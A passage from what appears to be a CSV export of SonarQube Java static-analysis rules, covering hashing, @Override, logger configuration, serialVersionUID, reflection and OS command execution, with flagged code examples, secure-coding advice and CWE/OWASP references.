        DigestUtils.shaHex(data); // Questionable
        DigestUtils.shaHex(stream); // Questionable
        DigestUtils.shaHex(str); // Questionable

        DigestUtils.sha1(data); // Questionable
        DigestUtils.sha1(stream); // Questionable
        DigestUtils.sha1(str); // Questionable
        DigestUtils.sha1Hex(data); // Questionable
        DigestUtils.sha1Hex(stream); // Questionable
        DigestUtils.sha1Hex(str); // Questionable

        DigestUtils.sha256(data); // Questionable
        DigestUtils.sha256(stream); // Questionable
        DigestUtils.sha256(str); // Questionable
        DigestUtils.sha256Hex(data); // Questionable
        DigestUtils.sha256Hex(stream); // Questionable
        DigestUtils.sha256Hex(str); // Questionable

        DigestUtils.sha384(data); // Questionable
        DigestUtils.sha384(stream); // Questionable
        DigestUtils.sha384(str); // Questionable
        DigestUtils.sha384Hex(data); // Questionable
        DigestUtils.sha384Hex(stream); // Questionable
        DigestUtils.sha384Hex(str); // Questionable

        DigestUtils.sha512(data); // Questionable
        DigestUtils.sha512(stream); // Questionable
        DigestUtils.sha512(str); // Questionable
        DigestUtils.sha512Hex(data); // Questionable
        DigestUtils.sha512Hex(stream); // Questionable
        DigestUtils.sha512Hex(str); // Questionable
    }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""https://cwe.mitre.org/data/definitions/916.html"">MITRE, CWE-916</a> - Use of Password Hash With Insufficient Computational Effort
  </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/759.html"">MITRE, CWE-759</a> - Use of a One-Way Hash without a Salt </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/760.html"">MITRE, CWE-760</a> - Use of a One-Way Hash with a Predictable Salt </li>
  <li> OWASP Top 10 2017 Category A3 - Sensitive Data Exposure </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat3"">SANS Top 25</a> - Porous Defenses </li>
</ul>",Hashing data is security-sensitive,[],CRITICAL,"['cwe', 'owasp-a3', 'sans-top25-porous']",SECURITY_HOTSPOT
2014-10-10T17:54:03+0200,"<p>Using the <code>@Override</code> annotation is useful for two reasons :</p>
<ul>
  <li> It elicits a warning from the compiler if the annotated method doesn't actually override anything, as in the case of a misspelling. </li>
  <li> It improves the readability of the source code by making it obvious that methods are overridden. </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
class ParentClass {
  public boolean doSomething(){...}
}
class FirstChildClass extends ParentClass {
  public boolean doSomething(){...}  // Noncompliant
}
</pre>
<h2>Compliant Solution</h2>
<pre>
class ParentClass {
  public boolean doSomething(){...}
}
class FirstChildClass extends ParentClass {
  @Override
  public boolean doSomething(){...}  // Compliant
}
</pre>
<h2>Exceptions</h2>
<p>This rule is relaxed when overriding a method from the <code>Object</code> class like <code>toString()</code>, <code>hashCode()</code>, ...</p>",squid:S1161,java,Java,"<p>Using the <code>@Override</code> annotation is useful for two reasons :</p>
<ul>
  <li> It elicits a warning from the compiler if the annotated method doesn't actually override anything, as in the case of a misspelling. </li>
  <li> It improves the readability of the source code by making it obvious that methods are overridden. </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
class ParentClass {
  public boolean doSomething(){...}
}
class FirstChildClass extends ParentClass {
  public boolean doSomething(){...}  // Noncompliant
}
</pre>
<h2>Compliant Solution</h2>
<pre>
class ParentClass {
  public boolean doSomething(){...}
}
class FirstChildClass extends ParentClass {
  @Override
  public boolean doSomething(){...}  // Compliant
}
</pre>
<h2>Exceptions</h2>
<p>This rule is relaxed when overriding a method from the <code>Object</code> class like <code>toString()</code>, <code>hashCode()</code>, ...</p>","""@Override"" should be used on overriding and implementing methods",[],MAJOR,['bad-practice'],CODE_SMELL
2018-11-12T11:11:26+0100,"<p>Configuring loggers is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-0285"">CVE-2018-0285</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2000-1127"">CVE-2000-1127</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-15113"">CVE-2017-15113</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-5742"">CVE-2015-5742</a> </li>
</ul>
<p>Logs are useful before, during and after a security incident.</p>
<ul>
  <li> Attackers will most of the time start their nefarious work by probing the system for vulnerabilities. Monitoring this activity and stopping it
  is the first step to prevent an attack from ever happening. </li>
  <li> In case of a successful attack, logs should contain enough information to understand what damage an attacker may have inflicted. </li>
</ul>
<p>Logs are also a target for attackers because they might contain sensitive information. Configuring loggers has an impact on the type of information
logged and how they are logged.</p>
<p>This rule flags for review code that initiates loggers configuration. The goal is to guide security code reviews.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> unauthorized users might have access to the logs, either because they are stored in an insecure location or because the application gives
  access to them. </li>
  <li> the logs contain sensitive information on a production server. This can happen when the logger is in debug mode. </li>
  <li> the log can grow without limit. This can happen when additional information is written into logs every time a user performs an action and the
  user can perform the action as many times as he/she wants. </li>
  <li> the logs do not contain enough information to understand the damage an attacker might have inflicted. The loggers mode (info, warn, error)
  might filter out important information. They might not print contextual information like the precise time of events or the server hostname. </li>
  <li> the logs are only stored locally instead of being backuped or replicated. </li>
</ul>
<p>You are at risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> Check that your production deployment doesn't have its loggers in ""debug"" mode as it might write sensitive information in logs. </li>
  <li> Production logs should be stored in a secure location which is only accessible to system administrators. </li>
  <li> Configure the loggers to display all warnings, info and error messages. Write relevant information such as the precise time of events and the
  hostname. </li>
  <li> Choose log format which is easy to parse and process automatically. It is important to process logs rapidly in case of an attack so that the
  impact is known and limited. </li>
  <li> Check that the permissions of the log files are correct. If you index the logs in some other service, make sure that the transfer and the
  service are secure too. </li>
  <li> Add limits to the size of the logs and make sure that no user can fill the disk with logs. This can happen even when the user does not control
  the logged information. An attacker could just repeat a logged action many times. </li>
</ul>
<p>Remember that configuring loggers properly doesn't make them bullet-proof. Here is a list of recommendations explaining on how to use your
logs:</p>
<ul>
  <li> Don't log any sensitive information. This obviously includes passwords and credit card numbers but also any personal information such as user
  names, locations, etc... Usually any information which is protected by law is good candidate for removal. </li>
  <li> Sanitize all user inputs before writing them in the logs. This includes checking its size, content, encoding, syntax, etc... As for any user
  input, validate using whitelists whenever possible. Enabling users to write what they want in your logs can have many impacts. It could for example
  use all your storage space or compromise your log indexing service. </li>
  <li> Log enough information to monitor suspicious activities and evaluate the impact an attacker might have on your systems. Register events such as
  failed logins, successful logins, server side input validation failures, access denials and any important transaction. </li>
  <li> Monitor the logs for any suspicious activity. </li>
</ul>
<p>See</p>
<ul>
  <li> <a href=""https://cwe.mitre.org/data/definitions/532.html"">MITRE, CWE-532</a> - Information Exposure Through Log Files </li>
  <li> <a href=""https://cwe.mitre.org/data/definitions/117.html"">MITRE, CWE-117</a> - Improper Output Neutralization for Logs </li>
  <li> <a href=""https://cwe.mitre.org/data/definitions/778.html"">MITRE, CWE-778</a> - Insufficient Logging </li>
  <li> OWASP Top 10 2017 Category A3 - Sensitive Data Exposure </li>
  <li> OWASP Top 10 2017 Category A10 - Insufficient Logging &amp; Monitoring </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat3"">SANS Top 25</a> - Porous Defenses </li>
</ul>
<h2>Questionable Code Example</h2>
<p>This rule supports the following libraries: Log4J, <code>java.util.logging</code> and Logback</p>
<pre>
// === Log4J 2 ===
import org.apache.logging.log4j.core.config.builder.api.ConfigurationBuilderFactory;
import org.apache.logging.log4j.Level;
import org.apache.logging.log4j.core.*;
import org.apache.logging.log4j.core.config.*;

// Questionable: creating a new custom configuration
abstract class CustomConfigFactory extends ConfigurationFactory {
    // ...
}

class A {
    void foo(Configuration config, LoggerContext context, java.util.Map&lt;String, Level&gt; levelMap,
            Appender appender, java.io.InputStream stream, java.net.URI uri,
            java.io.File file, java.net.URL url, String source, ClassLoader loader, Level level, Filter filter)
            throws java.io.IOException {
        // Creating a new custom configuration
        ConfigurationBuilderFactory.newConfigurationBuilder();  // Questionable

        // Setting loggers level can result in writing sensitive information in production
        Configurator.setAllLevels(""com.example"", Level.DEBUG);  // Questionable
        Configurator.setLevel(""com.example"", Level.DEBUG);  // Questionable
        Configurator.setLevel(levelMap);  // Questionable
        Configurator.setRootLevel(Level.DEBUG);  // Questionable

        config.addAppender(appender); // Questionable: this modifies the configuration

        LoggerConfig loggerConfig = config.getRootLogger();
        loggerConfig.addAppender(appender, level, filter); // Questionable
        loggerConfig.setLevel(level); // Questionable

        context.setConfigLocation(uri); // Questionable

        // Load the configuration from a stream or file
        new ConfigurationSource(stream);  // Questionable
        new ConfigurationSource(stream, file);  // Questionable
        new ConfigurationSource(stream, url);  // Questionable
        ConfigurationSource.fromResource(source, loader);  // Questionable
        ConfigurationSource.fromUri(uri);  // Questionable
    }
}



</pre>
<pre>
// === java.util.logging ===
import java.util.logging.*;

class M {
    void foo(LogManager logManager, Logger logger, java.io.InputStream is, Handler handler)
            throws SecurityException, java.io.IOException {
        logManager.readConfiguration(is); // Questionable

        logger.setLevel(Level.FINEST); // Questionable
        logger.addHandler(handler); // Questionable
    }
}
</pre>
<pre>
// === Logback ===
import ch.qos.logback.classic.util.ContextInitializer;
import ch.qos.logback.core.Appender;
import ch.qos.logback.classic.joran.JoranConfigurator;
import ch.qos.logback.classic.spi.ILoggingEvent;
import ch.qos.logback.classic.*;

class M {
    void foo(Logger logger, Appender&lt;ILoggingEvent&gt; fileAppender) {
        System.setProperty(ContextInitializer.CONFIG_FILE_PROPERTY, ""config.xml""); // Questionable
        JoranConfigurator configurator = new JoranConfigurator(); // Questionable

        logger.addAppender(fileAppender); // Questionable
        logger.setLevel(Level.DEBUG); // Questionable
    }
}
</pre>
<h2>Exceptions</h2>
<p>Log4J 1.x is not covered as it has reached <a href=""https://blogs.apache.org/foundation/entry/apache_logging_services_project_announces"">end of
life</a>.</p>",squid:S4792,java,Java,"<p>Configuring loggers is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-0285"">CVE-2018-0285</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2000-1127"">CVE-2000-1127</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-15113"">CVE-2017-15113</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-5742"">CVE-2015-5742</a> </li>
</ul>
<p>Logs are useful before, during and after a security incident.</p>
<ul>
  <li> Attackers will most of the time start their nefarious work by probing the system for vulnerabilities. Monitoring this activity and stopping it
  is the first step to prevent an attack from ever happening. </li>
  <li> In case of a successful attack, logs should contain enough information to understand what damage an attacker may have inflicted. </li>
</ul>
<p>Logs are also a target for attackers because they might contain sensitive information. Configuring loggers has an impact on the type of information
logged and how they are logged.</p>
<p>This rule flags for review code that initiates loggers configuration. The goal is to guide security code reviews.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> unauthorized users might have access to the logs, either because they are stored in an insecure location or because the application gives
  access to them. </li>
  <li> the logs contain sensitive information on a production server. This can happen when the logger is in debug mode. </li>
  <li> the log can grow without limit. This can happen when additional information is written into logs every time a user performs an action and the
  user can perform the action as many times as he/she wants. </li>
  <li> the logs do not contain enough information to understand the damage an attacker might have inflicted. The loggers mode (info, warn, error)
  might filter out important information. They might not print contextual information like the precise time of events or the server hostname. </li>
  <li> the logs are only stored locally instead of being backuped or replicated. </li>
</ul>
<p>You are at risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> Check that your production deployment doesn't have its loggers in ""debug"" mode as it might write sensitive information in logs. </li>
  <li> Production logs should be stored in a secure location which is only accessible to system administrators. </li>
  <li> Configure the loggers to display all warnings, info and error messages. Write relevant information such as the precise time of events and the
  hostname. </li>
  <li> Choose log format which is easy to parse and process automatically. It is important to process logs rapidly in case of an attack so that the
  impact is known and limited. </li>
  <li> Check that the permissions of the log files are correct. If you index the logs in some other service, make sure that the transfer and the
  service are secure too. </li>
  <li> Add limits to the size of the logs and make sure that no user can fill the disk with logs. This can happen even when the user does not control
  the logged information. An attacker could just repeat a logged action many times. </li>
</ul>
<p>Remember that configuring loggers properly doesn't make them bullet-proof. Here is a list of recommendations explaining on how to use your
logs:</p>
<ul>
  <li> Don't log any sensitive information. This obviously includes passwords and credit card numbers but also any personal information such as user
  names, locations, etc... Usually any information which is protected by law is good candidate for removal. </li>
  <li> Sanitize all user inputs before writing them in the logs. This includes checking its size, content, encoding, syntax, etc... As for any user
  input, validate using whitelists whenever possible. Enabling users to write what they want in your logs can have many impacts. It could for example
  use all your storage space or compromise your log indexing service. </li>
  <li> Log enough information to monitor suspicious activities and evaluate the impact an attacker might have on your systems. Register events such as
  failed logins, successful logins, server side input validation failures, access denials and any important transaction. </li>
  <li> Monitor the logs for any suspicious activity. </li>
</ul>
<p>See</p>
<ul>
  <li> <a href=""https://cwe.mitre.org/data/definitions/532.html"">MITRE, CWE-532</a> - Information Exposure Through Log Files </li>
  <li> <a href=""https://cwe.mitre.org/data/definitions/117.html"">MITRE, CWE-117</a> - Improper Output Neutralization for Logs </li>
  <li> <a href=""https://cwe.mitre.org/data/definitions/778.html"">MITRE, CWE-778</a> - Insufficient Logging </li>
  <li> OWASP Top 10 2017 Category A3 - Sensitive Data Exposure </li>
  <li> OWASP Top 10 2017 Category A10 - Insufficient Logging &amp; Monitoring </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat3"">SANS Top 25</a> - Porous Defenses </li>
</ul>
<h2>Questionable Code Example</h2>
<p>This rule supports the following libraries: Log4J, <code>java.util.logging</code> and Logback</p>
<pre>
// === Log4J 2 ===
import org.apache.logging.log4j.core.config.builder.api.ConfigurationBuilderFactory;
import org.apache.logging.log4j.Level;
import org.apache.logging.log4j.core.*;
import org.apache.logging.log4j.core.config.*;

// Questionable: creating a new custom configuration
abstract class CustomConfigFactory extends ConfigurationFactory {
    // ...
}

class A {
    void foo(Configuration config, LoggerContext context, java.util.Map&lt;String, Level&gt; levelMap,
            Appender appender, java.io.InputStream stream, java.net.URI uri,
            java.io.File file, java.net.URL url, String source, ClassLoader loader, Level level, Filter filter)
            throws java.io.IOException {
        // Creating a new custom configuration
        ConfigurationBuilderFactory.newConfigurationBuilder();  // Questionable

        // Setting loggers level can result in writing sensitive information in production
        Configurator.setAllLevels(""com.example"", Level.DEBUG);  // Questionable
        Configurator.setLevel(""com.example"", Level.DEBUG);  // Questionable
        Configurator.setLevel(levelMap);  // Questionable
        Configurator.setRootLevel(Level.DEBUG);  // Questionable

        config.addAppender(appender); // Questionable: this modifies the configuration

        LoggerConfig loggerConfig = config.getRootLogger();
        loggerConfig.addAppender(appender, level, filter); // Questionable
        loggerConfig.setLevel(level); // Questionable

        context.setConfigLocation(uri); // Questionable

        // Load the configuration from a stream or file
        new ConfigurationSource(stream);  // Questionable
        new ConfigurationSource(stream, file);  // Questionable
        new ConfigurationSource(stream, url);  // Questionable
        ConfigurationSource.fromResource(source, loader);  // Questionable
        ConfigurationSource.fromUri(uri);  // Questionable
    }
}



</pre>
<pre>
// === java.util.logging ===
import java.util.logging.*;

class M {
    void foo(LogManager logManager, Logger logger, java.io.InputStream is, Handler handler)
            throws SecurityException, java.io.IOException {
        logManager.readConfiguration(is); // Questionable

        logger.setLevel(Level.FINEST); // Questionable
        logger.addHandler(handler); // Questionable
    }
}
</pre>
<pre>
// === Logback ===
import ch.qos.logback.classic.util.ContextInitializer;
import ch.qos.logback.core.Appender;
import ch.qos.logback.classic.joran.JoranConfigurator;
import ch.qos.logback.classic.spi.ILoggingEvent;
import ch.qos.logback.classic.*;

class M {
    void foo(Logger logger, Appender&lt;ILoggingEvent&gt; fileAppender) {
        System.setProperty(ContextInitializer.CONFIG_FILE_PROPERTY, ""config.xml""); // Questionable
        JoranConfigurator configurator = new JoranConfigurator(); // Questionable

        logger.addAppender(fileAppender); // Questionable
        logger.setLevel(Level.DEBUG); // Questionable
    }
}
</pre>
<h2>Exceptions</h2>
<p>Log4J 1.x is not covered as it has reached <a href=""https://blogs.apache.org/foundation/entry/apache_logging_services_project_announces"">end of
life</a>.</p>",Configuring loggers is security-sensitive,[],CRITICAL,"['cwe', 'owasp-a10', 'owasp-a3', 'sans-top25-porous']",SECURITY_HOTSPOT
2018-11-12T11:11:26+0100,"<p>Providing a <code>serialVersionUID</code> field on <code>Serializable</code> classes is strongly recommended by the <code>Serializable</code>
documentation but blindly following that recommendation can be harmful.</p>
<p><code>serialVersionUID</code> value is stored with the serialized data and this field is verified when deserializing the data to ensure that the
code reading the data is compatible with the serialized data. In case of failure, it means the serialized data and the code are not in sync and this
fine because you know what's wrong.</p>
<p>When the <code>serialVersionUID</code> is generated by an IDE or blindly hard-coded, there is a high probability that one will forget to update the
<code>serialVersionUID</code> value when the <code>Serializable</code> class is later enriched with additional fields. As a consequence, old
serialized data will incorrectly be considered compatible with the newer version of the code creating situations which are hard to debug.</p>
<p>Therefore, defining <code>serialVersionUID</code> should be done with care. This rule raises an issue on each <code>serialVersionUID</code> field
declared on classes implementing <code>Serializable</code> to be sure the presence and the value of the <code>serialVersionUID</code> field is
challenged and validated by the team.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class Foo implements Serializable {
  private static final long serialVersionUID = 1;
}

public class BarException extends RuntimeException {
  private static final long serialVersionUID = 8582433437601788991L;
}
</pre>
<h2>See</h2>
<ul>
  <li> Vojtech Ruzicka's Programming Blog: <a href=""https://www.vojtechruzicka.com/explicitly-declare-serialversionuid/"">Should I explicitly declare
  serialVersionUID?</a> </li>
</ul>",squid:S4926,java,Java,"<p>Providing a <code>serialVersionUID</code> field on <code>Serializable</code> classes is strongly recommended by the <code>Serializable</code>
documentation but blindly following that recommendation can be harmful.</p>
<p><code>serialVersionUID</code> value is stored with the serialized data and this field is verified when deserializing the data to ensure that the
code reading the data is compatible with the serialized data. In case of failure, it means the serialized data and the code are not in sync and this
fine because you know what's wrong.</p>
<p>When the <code>serialVersionUID</code> is generated by an IDE or blindly hard-coded, there is a high probability that one will forget to update the
<code>serialVersionUID</code> value when the <code>Serializable</code> class is later enriched with additional fields. As a consequence, old
serialized data will incorrectly be considered compatible with the newer version of the code creating situations which are hard to debug.</p>
<p>Therefore, defining <code>serialVersionUID</code> should be done with care. This rule raises an issue on each <code>serialVersionUID</code> field
declared on classes implementing <code>Serializable</code> to be sure the presence and the value of the <code>serialVersionUID</code> field is
challenged and validated by the team.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class Foo implements Serializable {
  private static final long serialVersionUID = 1;
}

public class BarException extends RuntimeException {
  private static final long serialVersionUID = 8582433437601788991L;
}
</pre>
<h2>See</h2>
<ul>
  <li> Vojtech Ruzicka's Programming Blog: <a href=""https://www.vojtechruzicka.com/explicitly-declare-serialversionuid/"">Should I explicitly declare
  serialVersionUID?</a> </li>
</ul>","""serialVersionUID"" should not be declared blindly",[],MINOR,"['pitfall', 'serialization']",CODE_SMELL
2018-11-12T11:11:26+0100,"<p>Executing code dynamically is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-9807"">CVE-2017-9807</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-9802"">CVE-2017-9802</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-9182"">CVE-2016-9182</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-1000210"">CVE-2018-1000210</a> </li>
</ul>
<p>It is dangerous to let external sources either:</p>
<ul>
  <li> execute unknown code in your process. Such <a href=""https://www.owasp.org/index.php/Code_Injection"">Injected Code</a> can either run on the
  server or in the client (exemple: XSS attack). </li>
  <li> select the code which will be executed via reflection. </li>
</ul>
<p>This rule marks for review each occurence of such dynamic code execution. The goal is to guide security code reviews.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> the executed code may come from a untrusted source and hasn't been sanitized. </li>
  <li> the code to run is dynamically chosen via reflection, and an untrusted source can use it to choose which code to run. For example a class could
  be retrieved by its name and this name comes from a user input. </li>
</ul>
<p>You are at risk if you answered yes to any of these questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Regarding the execution of unknown code, the best solution is to not run code provided by an untrusted source. If you really need to do it, run the
code in a <a href=""https://en.wikipedia.org/wiki/Sandbox_(computer_security)"">sandboxed</a> environment. Use jails, firewalls and whatever means your
operating system and programming language provide (example: <a
href=""https://wiki.sei.cmu.edu/confluence/display/java/SEC54-J.+Create+a+secure+sandbox+using+a+security+manager"">Security Managers</a> in java, <a
href=""https://www.w3schools.com/tags/att_iframe_sandbox.asp"">iframes</a> and <a href=""https://en.wikipedia.org/wiki/Same-origin_policy"">same-origin
policy</a> for javascript in a web browser).</p>
<p>Do not try to create a blacklist of dangerous code. It is impossible to cover all attacks that way.</p>
<p>As for the use of reflection, it should be strictly controlled as it can lead to many vulnerabilities. Never let an untrusted source decide what
code to run. If you have to do it anyway, create a list of allowed code and choose among this list.</p>
<h2>Questionable Code Example</h2>
<pre>
public class Reflection {

    public static void run(java.lang.ClassLoader loader, String className, String methodName, String fieldName,
            Class&lt;?&gt; parameterTypes)
            throws NoSuchMethodException, SecurityException, ClassNotFoundException, NoSuchFieldException {

        Class&lt;?&gt; clazz = Class.forName(className); // Questionable
        clazz.getMethod(methodName, parameterTypes); // Questionable
        clazz.getMethods(); // Questionable
        clazz.getField(fieldName); // Questionable
        clazz.getFields(); // Questionable
        clazz.getDeclaredField(fieldName); // Questionable
        clazz.getDeclaredFields(); // Questionable
        clazz.getDeclaredClasses(); // Questionable

        loader.loadClass(className); // Questionable
    }
}
</pre>
<h2>Exceptions</h2>
<p>Calling reflection methods with a hard-coded type name, method name or field name will not raise an issue.</p>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/95.html"">MITRE CWE-95</a> - Improper Neutralization of Directives in Dynamically Evaluated Code
  ('Eval Injection') </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/470.html"">MITRE CWE-470</a> - Use of Externally-Controlled Input to Select Classes or Code
  ('Unsafe Reflection') </li>
  <li> OWASP Top 10 2017 Category A1 - Injection </li>
  <li> OWASP Top 10 2017 Category A7 - Cross-Site Scripting (XSS) </li>
</ul>",squid:S1523,java,Java,"<p>Executing code dynamically is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-9807"">CVE-2017-9807</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-9802"">CVE-2017-9802</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-9182"">CVE-2016-9182</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-1000210"">CVE-2018-1000210</a> </li>
</ul>
<p>It is dangerous to let external sources either:</p>
<ul>
  <li> execute unknown code in your process. Such <a href=""https://www.owasp.org/index.php/Code_Injection"">Injected Code</a> can either run on the
  server or in the client (exemple: XSS attack). </li>
  <li> select the code which will be executed via reflection. </li>
</ul>
<p>This rule marks for review each occurence of such dynamic code execution. The goal is to guide security code reviews.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> the executed code may come from a untrusted source and hasn't been sanitized. </li>
  <li> the code to run is dynamically chosen via reflection, and an untrusted source can use it to choose which code to run. For example a class could
  be retrieved by its name and this name comes from a user input. </li>
</ul>
<p>You are at risk if you answered yes to any of these questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Regarding the execution of unknown code, the best solution is to not run code provided by an untrusted source. If you really need to do it, run the
code in a <a href=""https://en.wikipedia.org/wiki/Sandbox_(computer_security)"">sandboxed</a> environment. Use jails, firewalls and whatever means your
operating system and programming language provide (example: <a
href=""https://wiki.sei.cmu.edu/confluence/display/java/SEC54-J.+Create+a+secure+sandbox+using+a+security+manager"">Security Managers</a> in java, <a
href=""https://www.w3schools.com/tags/att_iframe_sandbox.asp"">iframes</a> and <a href=""https://en.wikipedia.org/wiki/Same-origin_policy"">same-origin
policy</a> for javascript in a web browser).</p>
<p>Do not try to create a blacklist of dangerous code. It is impossible to cover all attacks that way.</p>
<p>As for the use of reflection, it should be strictly controlled as it can lead to many vulnerabilities. Never let an untrusted source decide what
code to run. If you have to do it anyway, create a list of allowed code and choose among this list.</p>
<h2>Questionable Code Example</h2>
<pre>
public class Reflection {

    public static void run(java.lang.ClassLoader loader, String className, String methodName, String fieldName,
            Class&lt;?&gt; parameterTypes)
            throws NoSuchMethodException, SecurityException, ClassNotFoundException, NoSuchFieldException {

        Class&lt;?&gt; clazz = Class.forName(className); // Questionable
        clazz.getMethod(methodName, parameterTypes); // Questionable
        clazz.getMethods(); // Questionable
        clazz.getField(fieldName); // Questionable
        clazz.getFields(); // Questionable
        clazz.getDeclaredField(fieldName); // Questionable
        clazz.getDeclaredFields(); // Questionable
        clazz.getDeclaredClasses(); // Questionable

        loader.loadClass(className); // Questionable
    }
}
</pre>
<h2>Exceptions</h2>
<p>Calling reflection methods with a hard-coded type name, method name or field name will not raise an issue.</p>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/95.html"">MITRE CWE-95</a> - Improper Neutralization of Directives in Dynamically Evaluated Code
  ('Eval Injection') </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/470.html"">MITRE CWE-470</a> - Use of Externally-Controlled Input to Select Classes or Code
  ('Unsafe Reflection') </li>
  <li> OWASP Top 10 2017 Category A1 - Injection </li>
  <li> OWASP Top 10 2017 Category A7 - Cross-Site Scripting (XSS) </li>
</ul>",Dynamically executing code is security-sensitive,[],CRITICAL,"['cwe', 'owasp-a1', 'owasp-a7']",SECURITY_HOTSPOT
2018-09-06T11:04:31+0200,"<p>OS commands are security-sensitive. For example, their use has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-12465"">CVE-2018-12465</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-7187"">CVE-2018-7187</a> </li>
</ul>
<p>Applications that execute operating system commands or execute commands that interact with the underlying system should neutralize any
externally-provided input used to construct those commands. Failure to do so could allow an attacker to execute unexpected or dangerous commands,
potentially leading to loss of confidentiality, integrity or availability.</p>
<p> </p>
<p>This rule flags code that specifies the name of the command to run. The goal is to guide security code reviews.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> the executed command is constructed by input that is externally-influenced, for example, user input (attacker). (*) </li>
  <li> the command execution is not restricted to the right users. (*) </li>
  <li> the application can be redesigned to not rely on external input to execute the command. </li>
</ul>
<p>(*) You are at risk if you answered yes to any of those questions.</p>
<p> </p>
<h2>Recommended Secure Coding Practices</h2>
<p>Restrict the control given to the user over the executed command:</p>
<ul>
  <li> make the executed command part of a whitelist and reject all commands not part of this list. </li>
  <li> sanitize the user input. </li>
</ul>
<p> </p>
<p>Restrict which users can have access to the command:</p>
<ul>
  <li> use a firewall to protect the process running the code, and to protect the network from the command. </li>
  <li> authenticate the user and allow only some users to run the command. </li>
</ul>
<p>Reduce the damage the command can do:</p>
<ul>
  <li> execute the code in a sandbox environment that enforces strict boundaries between the operating system and the process. For example: a ""jail"".
  </li>
  <li> refuse to run the command if the process has too many privileges. For example: forbid running the code as ""root"". </li>
</ul>
<p> </p>
<h2>Questionable Code Example</h2>
<pre>
Runtime.getRuntime().exec(...);  // Questionable. Validate the executed command.

ProcessBuilder pb = new ProcessBuilder(command);  // Questionable.
pb.command(command);  // Questionable.

// === apache.commons ===
import org.apache.commons.exec.CommandLine;
import org.apache.commons.exec.DefaultExecutor;

CommandLine cmdLine = CommandLine.parse(""bad.exe"");
DefaultExecutor executor = new DefaultExecutor();
executor.execute(cmdLine); // Questionable

</pre>
<h2>Exceptions</h2>
<p>The following code will not raise any issue.</p>
<pre>
ProcessBuilder pb = new ProcessBuilder();
pb.command();
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/78"">MITRE, CWE-78</a> - Improper Neutralization of Special Elements used in an OS Command </li>
  <li> OWASP Top 10 2017 Category A1 - Injection </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat1"">SANS Top 25</a> - Insecure Interaction Between Components </li>
</ul>",squid:S4721,java,Java,"<p>OS commands are security-sensitive. For example, their use has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-12465"">CVE-2018-12465</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-7187"">CVE-2018-7187</a> </li>
</ul>
<p>Applications that execute operating system commands or execute commands that interact with the underlying system should neutralize any
externally-provided input used to construct those commands. Failure to do so could allow an attacker to execute unexpected or dangerous commands,
potentially leading to loss of confidentiality, integrity or availability.</p>
<p> </p>
<p>This rule flags code that specifies the name of the command to run. The goal is to guide security code reviews.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> the executed command is constructed by input that is externally-influenced, for example, user input (attacker). (*) </li>
  <li> the command execution is not restricted to the right users. (*) </li>
  <li> the application can be redesigned to not rely on external input to execute the command. </li>
</ul>
<p>(*) You are at risk if you answered yes to any of those questions.</p>
<p> </p>
